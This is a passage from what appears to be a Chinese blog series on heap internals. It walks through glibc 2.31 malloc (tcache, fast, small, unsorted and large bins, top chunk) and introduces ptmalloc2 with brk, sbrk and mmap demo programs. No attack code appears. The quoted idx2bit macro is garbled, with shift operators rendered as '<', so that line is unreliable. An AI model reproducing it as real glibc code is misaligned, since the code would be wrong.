tcache_entry 的下一个 tcache_entry，相当于将原先第一个 tcache_entry 给取出来（这玩意本质上就是 malloc_chunk，用到的字段不同，参考前一篇介绍的内容） 修改此 tcache_bin 对应 tcache_counts 中表示该链上 chunk 数量的值，执行减 1 操作 将取出的 chunk 的 key 字段置为 NULL，表示已经从 tcache 上取出；最后将其返回 chunk_is_mmapped 这个宏就是判断当前这个 chunk 是否通过mmap()申请的，这部分在前一篇介绍 malloc_chunk 时有提到，在 chunksize 的低 3 位保存了当前 chunk 的一些属性，其中下标为1的位（10b）就是用于判断 IS_MAPPED 的 M 位 chunk2mem / mem2chunk这俩宏功能互补，所以放在一起说 这个宏传入的参数是经过mem2chunk得到的 chunk 地址，用来获取 chunk 所在的分配区（arena） 首先会调用chunk_main_arena这个宏，判断是否设置了 NON_MAIN_ARENA 位，这个值若未设置，就可以直接判断出是 main_arena（主分配区） 否则，先计算 HEAP_MAX_SIZE - 1 取反后的值，将其与 chunk 所在地址进行与操作，从而得到 chunk 所在堆的 heap_info 地址（这么做是因为每次申请的堆的起始地址是与 HEAP_MAX_SIZE 对齐的，因此这样可以取到堆的起始地址，从而拿到堆的 heap_info） 这里再回顾一下前一篇中总结的概念：一个堆对应一个 heap_info，一个 thread_arena（非主分配区） 对应一个 malloc_state，一个 thread_arena 中包含多个堆 拿到 heap_info 的地址后，就可以根据 ar_ptr 字段得到堆所在的分配区的地址了 arena_get这里涉及到的函数比较多，分开来讲 arena_get： 直接从 thread_arena 获取分配区（主分配区的获取不使用arena_get()） 将获取到的分配区和申请内存大小作为参数传入 arean_lock() arena_lock： 判断是否成功获取分配区，若成功获取，则调用__libc_lock_lock对分配区上锁 若获取失败，则调用arena_get2()重新获取分配区 arena_get2： 这个函数就干了一件事，调用get_free_list()获取分配区，如果获取成功则将分配区返回，这里get_free_list()返回的是 malloc_state 结构体 get_free_list： 想要弄明白这个函数，需要回顾下前一篇中介绍 malloc_state 的部分 这里的 replaced_arena 是给下面要分析的arena_get_retry()用的，调用arena_get()时这个值通常为 NULL 先获取 free_list 上的第一个空闲分配区（free_arena），这是一个串着所有空闲分配区的链表，然后将其从 free_list 上摘下来 摘下来后，修改分配区的 attached_threads 的值为1，表明该分配区附加到当前线程；如果是通过arena_get_retry调用的，则还会将线程与原先的分配区（replaced_arena）进行 detach 操作；最后将新获取的分配区返回 arena_get_retry 对于非主分配区来说，如果分配区没空间了，可以考虑试着从主分配区分出来一点；否则，试着通过sbrk()进行分配区扩展；如果还不行的话，就试试其它空闲的分配区。这里最终调用回到了arena_get2()上面，前面刚分析过，就不再赘述了 _int_malloc 主流程初始校验 _int_malloc()接收两个参数，分配区和需要分配的大小，然后从分配区中分配满足需求大小的 chunk 变量中需要注意，mchunkptr 与 mbinptr 类型均是 malloc_chunk 结构体，其余参考注释即可 进入函数后最先会遇到两处校验： checked_request2size()前面分析过了，这里主要是判断申请的内存大小是否超过了边界，若未超过，则会计算出至少需要分配的 chunksize，将值保存到 nb 中，然后进入下一个判断 接下来会判断 av 也就是传入的分配区是否为空，通常不为空。但如果为空，说明前面arena_get()与arena_get_retry()都未能获取到分配区。此时就会调用sysmalloc()去请求一个 chunk，通过alloc_perturb()初始化后，将这个 chunk 返回。这里 perturb_byte 的值默认为 0 这里需要补充一些宏的含义（此处来自xi@0ji233的文章） c123456// 这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就// 把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。// 或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。__glibc_unlikely(exp): 表示exp很可能为假__glibc_likely(exp): 表示exp很可能为真__builtin_expect(exp, value): 表示exp==value大概率成立 Fast Bin 处理流程 在 fast bin 处理的开始处有一个宏定义如下： 这个宏主要是通过 lock-free 的技术实现单向链表删除第一个 node 的操作，暂时不必关注 接下来进入 fast bin 的处理过程，源码的格式看着可能比较乱，这里分别框出来来看： 首先，判断 nb（先前计算出的所需 chunk 大小）是否位于 fast bin 范围内，如果在范围内，就进入红框做进一步处理，否则直接跳过 fast bin 的处理逻辑 红色方框： 先通过fastbin_index算出 idx，即所需的 chunk 位于哪条 bin 上 调用fastbin获取对应 bin 的链表头，并将链表上的第一个 chunk 地址赋给 victim 判断 vicitim 是否存在，若不存在，说明这条 bin 上已经没有多余的 chunk 了，又因为 fast bin 中是大小严格匹配的，如果大小符合的 chunk 不存在，也不会去寻找其它的 bin，就会直接跳过 fast bin 剩余的处理逻辑 橙色方框： 进入橙色方框，说明 chunk 存在。这里只做了一件事，就是将这个 chunk 从 bin 上摘下来；由于 fast bin 是先进后出单链表，具体手法就是令当前 bin 的指针指向最后一个 chunk 的前一个。其中REMOVE_FB这个宏对应的是多线程的处理 蓝色方框： 这部分主要是两个 check，第一个 check 是用 vicitim 再算一遍，判断其是否属于它原先所在的 bin 第二个 check 是对一些标志位的 check 粉色方框： 这里是仅在开启了 tcache 的情况下才会发生的操作，当然 glibc2.31 版本中 tcache 是默认开启的 首先根据申请的 chunk 的大小，计算出当前 fast bin 对应的 tcache bin 是哪一个 如果当前 fast bin 不为空，且 tcache bin 仍有多余空间（少于 7 个 chunk），就会将 fast bin 中的 chunk 移动到 tcache bin 中，这个操作放在一个循环里，每轮都会判断一次 fast bin 是否还有 chunk 以及 tcache bin 是否还有空间。从 fast bin 摘下来的操作和前面橙色方框中的一样；放入 tcache bin 中则是用的 tcache_put 绿色方框： 粉色方框是不影响整体逻辑的部分，这里可以直接跟着蓝色方框来看 拿到 vicitim 后，调用chunk2mem将指针指向 chunk 存储数据的开始地址 再调用alloc_perturb()对这块内存初始化，然后返回给用户 Small Bin 处理流程 如果 fast bin 中没有合适的 chunk，且所需 chunk 的大小位于 small bin 范围内，那么就会进入 small bin 的处理流程。small bin 与 fast bin 的处理流程大体看着类似，但是细节有所不同： 首先是判断申请的 chunksize 范围是否在 small bin 的范围内，不在就跳过这段处理逻辑，在的话就 先调用smallbin_index算出 chunk 所在的 idx 是多少 再调用bin_at得到 idx 在 bins 中对应的那个 bin 的链表头。这里简单回顾一下，bins 是一个数组，数组中包含了 unsorted bin、small bin 以及 large bin 中各个 bin 的链表头，这些 bin 都是双链表 然后判断这个链表头的后一个元素是否还是它自己（注意这里在判断的同时，也进行了赋值操作，此时该链表若至少存在 1 个 chunk，那么 vicitim 指向的就是这个 chunk 的地址），如果是，说明这个 bin 已经空了，就跳过 small bin 的处理逻辑，因为 small bin 和 fast bin 一样也是严格匹配的，一旦大小不符合，就会跳过这段处理逻辑 否则，获取 vicitim 的下一个 chunk，victim 是刚刚在进行判断链表是否为空时，取到的第一个 chunk，并判断这个 chunk 与 victim 之间的双链表是否完整，从而防止一些堆利用 然后，通过set_inuse_bit_at_offset将 victim 之后（进程虚拟内存中紧挨着 victim 地址的 chunk）的一个 chunk 的 prev_inuse 设置为 1，表示 victim 这个 chunk 正在被使用。fast bin 处理过程中是没有这个操作的，因为 fast bin 中的 chunk 默认都设置了 prev_inuse 的值，从而防止 chunk 之间的前后合并 设置完以后是一个常规的链表操作，将 victim 从双链表上摘下来 然后再判断一下用来分配这个 chunk 的分配区是否为主分配区，若是，则设置相应字段的值 接着调用check_malloced_chunk进行一些字段的检查 接下来是针对 tcache 情况的一些处理以及将 chunk 返回给用户，这部分和 fast bin 处理过程也很像，简单来看下： tcache 处理的部分和 fast bin 中 tcache 处理的部分基本上一样，就是在对应大小（刚刚分配的 chunk 的大小）的 small bin 不为空且 tcache bin 还有额外空间时，通过循环将 small bin 中的 chunk 塞到 tcache bin 中；且每次循环判断一次 small bin 是否为空，以及 tcache bin 是否满了。这里仅说下不同点： small bin 中的 chunk 放入 tcache bin 中时需要设置 prev_inuse；fast bin 中的 chunk 默认是设置了的 small bin 断链进行的是双链表操作；fast bin 是单链表操作 small bin 需要判断是否为主分配区，并设置相应字段；fast bin 没有 最后和 fast bin 一样，将分配的好的 chunk 初始化后返回给用户 Unsorted Bin 处理流程 如果在 small bin 或者 fast bin 处理流程中找到了合适大小的 chunk，那么程序就返回了。如果执行到这里，说明 chunk 大小位于 large bin 中或者在 small bin 和 fast bin 中没有找到所需大小的块，接下来就沿着这个思路结合源码继续分析 首先的一个 else 块，它对应前面的if (in_smallbin_range(nb))，因此，如果进入了 else 语句，那么说明所需 chunk 的大小位于 large bin 中，这里会做两件事： 通过宏largebin_index获取所需 chunk 在 large bin 中的 index，即所在的 bin 链 判断 fast bin 是否存在（即是否已经初始化），若存在，则调用malloc_consolidate()将 fast bin 中的所有 chunk free 掉并与前后的块合并，然后存到 unsorted bin 中 如果没有进入 else 语句，说明所需的大小位于 fast bin 或者 small bin 中，但是 fast bin 与 small bin 分配时要求大小严格匹配，因此没有找到合适的块，所以就会进入到 unsorted bin 是处理流程。并且对于 large bin 范围的申请，在 else 语句执行完后，也会执行到此处： glibc2.31版本默认开启 tcache，因此会执行此处的代码 调用csize2tidx获取所需 chunk 大小在 tcache bin 中的 idx，如果 nb 的大小位于 tcache 范围内（tcache 范围涵盖了 large bin 中的前面一小部分），则将其赋值给变量 tcache_nb 接下来进入一个大的 for 循环，该循环可以忽略，因为一直延续到__int_malloc结束，重点在于这个 while 循环 unsorted bin 是一个双链表，位于 bins 上的第一个 迭代循环 unsorted bin 中的所有 chunk，变量 iters 跟踪迭代次数 victim 表示当前 chunk，bck 为 unsorted bin 上 victim 的后一个 chunk，next 为堆上 victim 的后一个 chunk chunksize用于获取 chunk 的大小，chunk_at_offset用于获取下一个 chunk 的地址 接下来会进行一堆 check： 检查 victim 和 next 的 size 不能小于最小的 chunksize，也不能大于所属分配区已经分配的内存大小 检查 next 的 prev_size 是否等于 victim 的 size 检查 victim->bk->fd 是否等于 victim，保证双链表完整性 检查 victim->fd 是否等于 unsorted_chunks(av) 这是因为在每轮循环开始有 victim = unsorted_chunks(av)->bk 检查 victim 是否设置了 prev_inuse，因为进入 unsorted bin 中的 chunk 都已经清空了该值 经过一系列 check 后，是针对各类情况的处理 如果同时满足以下 4 个条件，则会进入对应的处理： 所需 chunk 的大小的范围在 small bin 中 unsorted bin 中仅剩最后一个 chunk bck = victim->bk victim = unsorted_chunks(av)->bk victim 是 last remainder chunk 该 last remainder chunk 的 size 需大于所需 chunk 大小与 MINSIZE 之和 具体是进行一次 chunk 切割的操作，把所需大小的 chunk 返回给用户，余下的部分作为 last remainder chunk 回到 unsorted bin 中，下面简单分析下这个过程： 计算出 remainder_size，然后通过chunk_at_offset拿到分割后 remainder 的地址（成为新的 last remainder chunk） 修改 unsorted bin 的头指针，将其指向 last remainder chunk 的位置 如果 remainder 大小不在 small bin 范围内，就添加 fd_nextsize 与 bk_nextsize 指针 设置 victim 与 remainder 的标志位 将 victim 存储数据的地址（victim + 2*SIZE_SZ）返回给用户 若不满足前面的判断条件，或 reminder 不够分割了，则会继续走到这里 首先会 check 一下链表的完整性，校验成功后，会将当前的 chunk 也就是 victim 从 unsorted bin 上面摘下来，方便后续操作 然后判断一下，如果 victim 的 size 刚好符合申请所需的 chunk 大小，那么先设置好标志位，然后： 如果开启了 tcache（glibc2.31中默认开启），并且victim size 对应的 tc_idx 所在 bin 中仍有空余位置（少于7个），那么就调用tcache_put()将 victim 放入到 tcache 中 如果对应的这条 tcache bin 已经满了，那么就直接将其返回给用户 接下来这步是 unsorted bin 处理的核心，它会将 unsorted bin 中遍历的 chunk 根据 size 放入对应的 small bin 或者 large bin 中，这是唯一一次将 chunk 放入 small bin 或者 large bin 的过程 如果 vicitim 的 size 位于 small bin： 获取该 size 在 small bin 中的 index 获取该 index 所在 bin 的头指针作为 bck 获取头指针后的第一个 chunk 指针作为 fwd 使用头插法将 victim 插入到 bck 与 fwd 之间的位置 否则，即 victim 的 size 位于 large bin 时： 获取该 size 在 large bin 中的 index 获取该 index 所在 bin 的头指针作为 bck 获取头指针后的第一个 chunk 指针作为 fwd，这里的第一个 chunk 可以理解为这条 bin 链上 size 最大的 chunk，因为 large bin 上每条 bin 里的 chunk 大小并不相同，可以参考下图chunk#1在这条 bin 链上的位置。当然这张图是针对 glibc2.23 版本的 large bin，在 glibc2.31 版本下 large bin 的排列与下图有所不同，稍微我们会说到 接下来会有一系列条件判断，以及对应的处理逻辑，这里我将不按照代码前后顺序去分析其逻辑，而是直接将不同条件及处理逻辑进行对应，这样也许更加清晰： 情形一：fwd == bck 此时 large bin 中不包含任何 chunk，victim 会将其 fd_nextsize 与 bk_nextsize 设置成自己，然后链入到 bin 上。此时 victim 的 fd 和 bk 都是 bin 链表头 情形二：fwd != bck 且 victim_size < #n_size（bck->bk） 这个情形可以参考上图，#n_size 指的就是上图蓝色的那个 chunk，前面 bck 指向了链表头，bck->bk 就指向最后一个 chunk，它是目前 large bin 上 size 最小的 chunk。如果 victim 的 size 比最小的 chunk 还要小。那么就会让 vicitim 作为最后一个 chunk 注意这里所说的最后一个 chunk，参考上图，large bin 的 bin 链中相同大小的 chunk 用 fd/bk 相连，不同大小的 chunk 用 fd_nextsize/bk_nextsize 相连。当前这种情况下，large bin 中还没有与 victim_size 相等的 chunk，且 vicitim_size 小于这条 bin 上的所有 chunk，因此被放在了最后一个的位置 这里具体所作的操作是，将 fwd 设置为链表头，bck 设置为原先最小 chunk 中的某一个（当有多个大小相同 chunk 的情况下，这个 bck 是与链表头相连的那一个，即这些 chunk 中的最后一个，而不是链在 fd_nextsize/bk_nextsize 上面的那个，因为它是相同大小 chunk 链上的第一个。另外通过它是用 fwd->fd->bk_nextsize 来定位的，而不是fwd->bk 来定位，也可以判断出这一点），fd_nextsize 指向原先最大 chunk 中的第一个，bk_nextsize 指向原先最小 chunk 中的第一个 情形三：fwd != bck 且 victim_size > fwd_size large bin 不为空，且不包含 victim_size 的 chunk，victim_size 大于链表中最小 chunk 的 size 这一步判断时，会通过循环，从前往后找（最大的 chunk 开始往最小的 chunk 找）直到 victim_size >= fwd_size（当前 chunk 的大小），这里是大于的情况，也就说，当前 large bin 中并没有与 victim_size 相同的 chunk 存在，这里的操作和情形二比较类似，区别是情形二是在链表尾进行操作，这里则是在链表中间进行操作 具体会通过 fd_nextsize/bk_nextsize 将 victim 放到 fwd 与 fwd->bk_nextsize 之间，这样保持了不同大小之间的 chunk 链接。然后将 victim 串在 fwd 与 fwd->bk 之间。这里注意 fwd->bk_nextsize 与 fwd->bk 指向的可能是不同 chunk。如果 fwd->bk_nextsize 指向的 chunk 相同大小的仅有它一个，那么此时 fwd->bk 与 fwd->bk_nextsize 是相同的，否则，fwd->bk 指向的是 fwd->bk_nextsize 所在 chunk 大小相同的这个链表里最靠后的一个 chunk。通过 fwd->bk_nextsize->fd->fd->fd...这种形式来访问 情形四：fwd != bck 且 victim_size == fwd_size large bin 不为空，包含 victim_size 的 chunk。 此时通过遍历相同大小的第一个 chunk（通过 fd_nextsize/bk_nextsize 相连），找到后将其插入到 fwd->fd 与 fwd 之间的位置，每次都是如此，也就是说新来的相同大小的 chunk 永远是放在第二个位置，原先的将会依次递增，然后结束。这下就可以解释情形三了，如果已经存在相同大小的 chunk，则找到这个大小位于 fd_nextsize/bk_nextsize 链上的那个 chunk 作为 fwd，将 victim 链入到 fwd 与 fwd->fd 之间，也就是相同大小 chunk 链表的第二个位置；如果不存在相同大小的 chunk，找到比 victim_size 小的里面最大的一个位于 fd_nextsize/bk_nextsize 链上的那个 chunk 作为 fwd，将 victim 链入到 fwd 与 fwd->bk 之间 fd_nextsize/bk_nextsize 那条链上的链入操作比较好理解，这里解释这么多主要是防止被上面一张图 large bin 的排布所误解，glibc2.31 这个版本的 large bin 构筑可以参考下图，图片来自pukrquq 这里是 unsorted bin 处理流程的第六步，在第四步时，如果从 unsorted bin 中摘下来的 chunk 刚好满足我们的需求，并且 tcache 仍然有多余的空间，那么 ptmalloc2 会先将这个 chunk 放到对应的 tcache bin 中，然后回到循环开头，直到下一个从 unsorted bin 中摘出来的 chunk 不满足需求（如果满足需求，同样会进入 tcache bin，若 tcache bin 已满，则直接返回给用户，不会执行到此处），那么再根据其 size 被分配到 small bin 或者 large bin 以后，就会执行到这里。 因为代码块不同，这里我们分为 3 个部分来看更为清晰些： 红色方框： 首先前面在从 unsorted bin 中取出 chunk 时，若发现符合要求的则会放入 tcache bin 中，并将 return_cached 的值设置为 1，会用于此处的判断。此外，tcache_unsorted_count 会在每次执行到这里时都会自增1，说明此轮没有 chunk 进入 tcache bin，而是进入了 large bin/ small bin。如果执行到此处的次数超过了 tcache_unsorted_limit 的值（默认是 0），就会调用 tcache_get()从 tcache bin 中取出符合需求的 chunk 返回给用户 绿色方框： 注意这部分有个大括号，闭合了前面的 while 循环，这里说的是，最多遍历 unsorted bin 一万次。不然一次产生了太多的 unsorted bin，然后我 malloc 一次，结果一直在这个循环里分配 unsorted bin 上面的 chunk，迟迟等不到分配的内存，所以这里会设定一个遍历的最大值 蓝色方框： 最后，出了 while 循环，也就遍历完 unsorted bin 了，这时会判断一下在先前遍历时是否找到符合需求的 chunk，若找到了且被放入了 tcache bin 中，则 return_cached 会被设置，此时调用tcache_get()即可。至此，unsorted bin 的处理逻辑就全部结束了。若仍未找到合适的 chunk，则会继续往后执行。 Large Bin 处理流程 在将 unsorted bin 中的 chunk 分配到 small bin 与 large bin 后，若所需的 chunk 大小位于 large bin 的范围区间，则会从这里开始处理 第一层校验会判断所需的 chunk 大小 nb 是否位于 small bin 范围内，这里再判断一遍的原因是 bin_at这个宏是根据 size 获取在 bins 中的 idx 的，前一篇我们提到，bins 中包含了 unsorted bin，small bin 以及 large bin。这里又判断一次范围是否在 small bin 也是为了确保，bin_at 的结果会落在 large bin 在 bins 对应的 idx 范围内 第二层校验是确保 large bin 不为空，且 large bin 中最大的 chunk 要比所需的 chunk 要大。first宏用于获取 idx 所在 bin 中第一个 chunk，即当前 idx 中最大的 chunk 接下来开始在 large bin 中寻找到最合适的那个 chunk，逻辑如下： 与插入 chunk 到 large bin 中不同，这里是从最小的 chunk 开始遍历，直到找到一个 chunk 大于等于所需的 chunk 大小 这里有两处判断，第二处用来确保 victim 所在的相同大小的双链上至少有两个 chunk，这样我们方便把第二个 chunk，也就是 victim->fd 给分配出去。victim != last(bin)主要是判断 size 最小的那个双链是否有两个或更多 chunk，因为这个双链上最后一个 chunk 与 bin 链表头相连，若相等，则说明该链上就只有一个 chunk，所以这两个判断证明的事是一样的 如果这条链上存在至少 2 个 chunk，那就取第 2 个，否则就用第 1 个。然后调用unlink_chunk()将这个 chunk 断链，并判断切去所需大小 nb 后，余下空间是否构成一个最小 chunk： 若不能，则对这个 chunk 设置并检查相应的标志位后，返回给用户 若能，则会切割出 nb 大小的部分，余下的部分作为 reminder 链入到 unsorted bin 中并根据大小决定是否设置 bk_nextsize / fd_nextsize，并对 reminder 与分割出的部分分别设置标志位，将分割出的部分返回给用户。此处分割剩下的 reminder，并没有被设置为该分配区的 last reminder chunk。分析到这里为止，仅在 unsorted bin 处理逻辑中的一次分割会设置 last reminder chunk，这点需要注意 如果在前面找到的 large bin 中未发现符合要求的 chunk，就会来到这一步。这部分代码看着不复杂，但是理解起来也不是非常容易，咱们来逐条分析： ++idx：在前一个 bins[idx] 所表示的 large bin 中没有找到合适的块，那么就增加 idx 的值，去 bins[idx++] 去找是否有符合的块。当然，理论上 bins[idx++] 中只要存在 chunk，就一定可以满足需求 bin_at：这个宏之前已经多次出现，就是拿到这个 idx 在 bins 对应的链表的头节点，这个头节点是一个 malloc_chunk 结构体，通过头节点的 fd/bk 指针可以访问这个 bin 上的第一个块（对应 large bin 中最大的块）与最后一块（对应 large bin 中最小的块） 接下来 3 行相互之间有所关联，需要放在一起来看： 首先 block，map，bit 这三个变量都是 unsigned int 类型 malloc_state 结构中有一个 binmap，它用来快速查找对应 index 所在的 bin 是否为空。这里通过 av->binmap 来访问 binmap 是个数组，长度为 4，每个元素都是一个 32 位的整数，加起来刚好是 128 位，刚好对应 bins 中的每个 bin，这 128 位可以看作是下标，若该下标的值置0，则说明 bin 为空 idx2block 这个宏的操作是将 idx 右移 5位，即将 idx 除 32，得到一个位于 0~3 范围内的值，从而找到该下标位于 binmap 中的第几个 32 位的整数上 idx2bit 这个宏我没大看明白，我知道它的意思应该是取到 idx 对应 large bin 的下标，因为后面移动到下一个 bin 时，bit 也会进行左移，但是我没看明白这个宏为什么是这样操作的 c12#define BINMAPSHIFT 5#define idx2bit(i) ((1U < ((i) & ((1U < BINMAPSHIFT) - 1)))) bins[81] 这种形式，同时 bit 也进行左移，即移动到这个 block 里面与表示这个 bin 所在位置的下标处 此时这个 bin 应该不是空的，但还是要判断一下。通过 last 获取到 bin 中的第一个元素，判断是否与自身相等，若相等，则说明 bin 为空，那么将这个 bin 在 binmap 中对应的 bit 置零，然后继续查看下一个 bin 若不为空，那这个 bin 里面的 chunk 肯定是可以拿来用的，所以这里取的是最小的 chunk 作为 victim。接下来的操作就和 unsorted bin 里面满足 4 个条件的那个操作，以及前面在一开始就可以找到一个合适的 large bin chunk 时的操作是类似的。就是先切割，挂到 unsorted bin 中，返回给用户这么几个操作，这里就不多赘述了。唯一需要注意的是，若所需的 chunk 位于 small bin 的范围（有人可能问这都校验多少次了为什么还可能是 small bin 范围，那可能是因为 small bin 和 unsorted bin 中都没有 chunk，最后只能来 large bin 申请），那么这里分割后的 reminder 会被设置为 last remainder chunk。这是第二次设置 last remainder chunk 的地方。 Top Chunk 处理流程如果 large bin 也是空的或者满足不了需求怎么办，那么前面有一处 goto use_top，就会来到这里，试图分配 top chunk 先通过 av->top 获取到 top chunk，通过宏 chunksize 获取到 top chunk 的大小。然后先做一个判断，看这个 top chunk 的 size 是否超过了 av->system_mem（这个值表示系统调用时申请的内存大小）。这个判断在 unsorted bin 的处理流程开始处也进行过一次 接下来，则根据 top chunk 的情况分类处理： 如果 top chunk 超过 nb（所需 chunk 大小） + MINSIZE，那么操作和前面 unsorted bin 与 large bin 分割类似。此处分割不会设置 last reminder chunk 否则，如果存在 fastbin，那么先调用 malloc_consolidate() 将 fastbin 合并；再根据所需的 chunk 大小设置 idx 的值，然后回到死循环的开头（图中紫色大括号，对应 unsorted bin 处理流程的开始部分）再进行一轮判断 若上面俩都没执行，那么调用 sysmalloc() 通过系统调用来进行内存分配，这部分可参考Pwnki的分析 _int_malloc 辅助函数_int_malloc() 中涉及到的辅助函数较多，大多数以宏为主，且都比较简单，跟进去看看源码就明白意思了。所以这部分暂时先鸽掉了，等后期复习本篇时如果发现有需要记录下的函数，再进行适当补充。 参考链接 博客园：glibc2.31 malloc 与 free 源码分析 看雪：malloc源码分析 CSDN：glibc下malloc与free的实现原理（二）：malloc函数的实现 堆学习之 fastbin-attack 看雪：how2heap深入浅出学习堆利用","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"堆基础01：ptmalloc2初探","slug":"堆基础01-ptmalloc2初探","date":"2022-06-30T06:48:29.000Z","updated":"2022-07-16T10:33:53.685Z","comments":true,"path":"2022/06/30/堆基础01-ptmalloc2初探/","link":"","permalink":"http://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/","excerpt":"","text":"前言 本篇第一部分会介绍堆分配涉及到的系统调用，这部分比较简单，通过实验即可理解；第二部分介绍 ptmalloc 分配器的起源与大致的分配策略；第三部分则是堆管理涉及到的数据结构，从而为下一篇源码分析做好准备 本篇内容均基于 64 位下的 Ubuntu 系统，所以描述的每个基本内存块（例如栈中的一个单元，寄存器默认的存储大小，一个指针的大小）都是 8 字节，而不是 4 字节 本篇内容基于pukrquq与xi@0ji233两位师傅发表在看雪的文章，此篇也是我正式开始堆学习的第一篇，目前计划第二篇为 glibc2.31 部分源码的分析，第三篇则以howtoheap上的练习为主，更全面的去了解堆。再之后，根据先前的学习，将部分内容总结经验，再在看雪发一篇文章 本篇数据结构的截图部分，均以 glibc2.31 版本的源码为依据，但部分来自网上的图片，可能是经典的 glibc2.23 或更早的版本，但不影响学习 调试工具pwndbg和peda是比较常用的gdb插件，两者各有优势，可惜并不兼容： pwndbg在调试堆的数据结构时很方便，常用命令可以参考这里 peda在查找字符串等功能时方便，常用命令可以参考这里 安装不困难（pwndbg可能需要依次安装psutil、pyelftools、capstone、pycparser），下载后，只需在home目录下的.gdbinit中写入 bash123source ~/peda/peda.py# 或者source ~/pwndbg/gdbinit.py 由于这类辅助用的gdb插件都不兼容，所以在使用某一款插件时需注释掉其它插件。如果结合源码调试的话，可配合 pwndbg 使用，并在.gdbinit写入源码路径，可参考这里 进程堆管理Linux提供了两种堆空间分配的方式，一个是brk系统调用，另一个是mmap系统调用。 上图为经典的Linux进程内存布局，从中可以看出： .bss段之上，向上扩展的一块内存是由brk系统调用分配的堆空间 stack空间之下，向下扩展的一块包含文件映射和匿名映射的内存，是由mmap系统调用分配的堆空间 brk/sbrkLinux手册中，对于brk与sbrk的描述如下： brk() and sbrk() change the location of the program break, which defines the end of the process’s data segment (i.e., the program break is the first location after the end of the uninitialized data segment). Increasing the program break has the effect of allocating memory to the process; decreasing the break deallocates memory 这里结合上面那张Linux进程内存布局图，会很好理解，在ASLR开启前后会有细微差别，具体如下： ASLR 关闭时，两者指向 data/bss 段的末尾，也就是 end_data ASLR 开启时，两者指向 data/bss 段的末尾加上一段随机 brk 偏移 关于这两个调用的用法，参考手册就行： c1234#include int brk(void *addr);void *sbrk(intptr_t increment); brk() sets the end of the data segment to the value specified by addr, when that value is reasonable, the system has enough memory, and the process does not exceed its maximum data size sbrk() increments the program’s data space by increment bytes. Calling sbrk() with an increment of 0 can be used to find the current location of the program break. （这里是因为sbrk()返回值执行该调用前的program break，即previous program break） 下面用例子加深一下印象： c12345678910111213141516171819202122232425262728293031#include #include void main() { void *curr_brk, *tmp_brk, *pre_brk; printf(\"Current Process PID: %d\\n\", getpid()); tmp_brk = curr_brk = sbrk(0); printf(\"After Initialize: %p\\n\", curr_brk); getchar(); brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"After Brk: %p\\n\", curr_brk); getchar(); pre_brk = sbrk(4096); curr_brk = sbrk(0); printf(\"Before Sbrk: %p\\n\", pre_brk); printf(\"After Sbrk: %p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"After Restore: %p\\n\", curr_brk); getchar();} 编译，运行程序，然后观察/proc/PID/maps中进行内存布局的情况，下图展示了第一次执行brk()前后的进程堆的变化，sbrk()的情况也差不多，这里不再贴图展示。 mmap/munmap这部分手册描述的内容比较多，先来看函数原型： c1234#include void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void *addr, size_t length); mmap()用于在进程的虚拟地址空间中创建一个新的映射，并将文件或设备映射到这块内存中 addr：指定映射的起始地址，若该参数为NULL时，则由操作系统自己决定mapping的起始地址 length：指定映射的大小，该值必须大于0 prot：描述这段映射的内存保护属性，且不能与打开文件时设置的访问模式相冲突 flags：这个字段指定了mapping的一些行为属性，例如是否修改原本被映射的文件，对于映射到同一块区域的其它进程是否可见等等。其中，当设置了MAP_ANONYMOUS属性后，这块地址空间将不会映射到任何文件，其内容将会被初始化为0，我们称这块空间为匿名（Anonymous）空间，匿名空间可以用来作为堆空间。此时，fd参数将会被忽略，offset参数应设置为0 fd：指向将被映射到内存中的文件对象 offset：被映射内容在文件中的起始偏移，该值必须是页（4KB）的整数倍 munmap则用于删除指定地址范围内的映射 下面看例子： c12345678910111213141516171819202122#include #include #include void main() { void *curr_brk; printf(\"Current Process PID: %d\\n\", getpid()); printf(\"After Initialized:\\n\"); getchar(); char *addr; addr = mmap(NULL, (size_t)4096, PROT_READ | PROT_WRITE, \\ MAP_PRIVATE | MAP_ANONYMOUS, 0, 0); printf(\"Mmap Finished: %p\\n\", addr); getchar(); munmap(addr, (size_t)4096); printf(\"Unmap Finished\\n\"); getchar();} 编译运行，再观察进程内存布局，可以发现mmap()申请的堆位于ld-2.31.so之间，这个链接文件也是通过mmap映射到进程的虚拟地址空间中的。结合前面的进程内存布局，就能看的很明白了 ptmalloc2分配策略为什么需要堆分配器前面介绍了用于管理堆的系统调用，由于现代操作系统都是按页进行管理，一页就是4KB/4096B，所以通过brk()或mmap()申请内存时都是一页一页的去申请，如果我只需要几个字节的内存，却跟操作系统申请了一整页的内存，那就显得很浪费了；并且，如果每次分配内存都走系统调用，也会增加操作系统的负担，因此，诞生了堆分配器，通过实现 malloc 与 free 辅助操作系统进行堆的管理。 早期 Linux 中的 malloc 版本是由 Doug Lea 实现的，这个时候的堆分配器也叫做 dlmalloc，dlmalloc 存在的问题是不支持多线程；后来 Wolfram Gloger 基于 dlmalloc 进行改进，实现了支持多线程的 ptmalloc 堆分配器，并随着时间发展形成了 ptmalloc2，也就是现在常用的堆分配器。 多线程实现为了支持多线程并行处理时对于内存的并发请求操作，malloc 的实现中把全局用户堆（heap）划分成很多子堆（sub-heap）。这些子堆是按照循环单链表的形式组织起来的。每一个子堆利用互斥锁（mutex）使线程对于该子堆的访问互斥。当某一线程需要调用 malloc 分配内存空间时，该线程搜索循环链表试图获得一个没有加锁的子堆。如果所有的子堆都已经加锁，那么 malloc 会开辟一块新的子堆，对于新开辟的子堆默认情况下是不加锁的，因此线程不需要阻塞就可以获得一个新的子堆并进行分配操作。在回收 free 操作中，线程同样试图获得待回收块所在子堆的锁，如果该子堆正在被别的线程使用，则需要等待直到其他线程释放该子堆的互斥锁之后才可以进行回收操作。 结构体概述ptmalloc2 